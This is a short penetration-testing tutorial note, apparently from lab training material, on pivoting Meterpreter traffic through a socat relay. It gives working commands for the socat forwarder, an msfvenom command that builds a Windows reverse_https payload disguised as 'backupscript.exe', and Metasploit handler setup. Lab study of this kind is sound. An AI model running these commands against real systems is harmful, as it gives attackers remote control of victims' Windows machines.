[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port

#### Starting Socat Listener

On pivot,
```shell-session
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18).

#### Creating the Windows Payload

```shell-session

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```


#### Starting MSF Console

```shell-session
sudo msfconsole
```

#### Configuring & Starting the multi/handler

```shell-session
use exploit/multi/handler
```

```shell-session
set payload windows/x64/meterpreter/reverse_https
```
```shell-session
set lhost 0.0.0.0
```
```shell-session
set lport 80
```
```shell-session
run
```


